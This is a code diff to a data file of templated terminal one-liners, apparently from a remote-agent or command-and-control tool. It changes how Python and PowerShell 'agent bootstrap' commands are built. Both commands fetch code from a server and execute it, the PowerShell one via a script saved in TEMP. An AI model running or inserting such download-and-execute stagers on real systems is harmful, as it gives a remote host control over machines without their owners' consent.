@@ -1,24 +1,20 @@
-// Terminal toolbar one-liners are intentionally kept as static data.
-// Add or remove entries here without touching toolbar/dialog rendering code.
-// Supported placeholders: {{server_host}}, {{server_port}}, {{web_port}}, optional listener selection.
-
+// Static one-liner entries; mode-specific bootstrap fields are rendered in OneLinersDialog.
 export const terminalOneLiners = [
   {
     label: 'Python',
     code:
-      'python3 -c "import requests; exec(requests.post(\'http://{{server_host}}:{{web_port}}/api/agent/bootstrap\', json={\'server_host\':\'{{server_host}}\',\'server_port\':{{server_port}},\'web_port\':{{web_port}}{{listener_payload_python}}}).text)"',
+      'python3 -c "import requests; exec(requests.post(\'http://{{server_host}}:{{web_port}}/api/agent/bootstrap\', json={{bootstrap_payload_python}}).text)"',
   },
   {
     label: 'Windows PowerShell',
     code:
       '$ip="{{server_host}}";' +
-      '$sp={{server_port}};' +
       '$p={{web_port}};' +
       'iwr "http://$($ip):$p/api/agent/bootstrap/ps1" ' +
       '-Method Post ' +
       '-ContentType "application/json" ' +
       '-UseBasicParsing ' +
-      '-Body "{`"server_host`":`"$ip`",`"server_port`":$sp,`"web_port`":$p{{listener_payload_ps1}}}" ' +
+      '-Body "{{bootstrap_payload_ps1}}" ' +
       '-OutFile "$env:TEMP\\bootstrap.ps1"; ' +
       '& "$env:TEMP\\bootstrap.ps1"',
   },
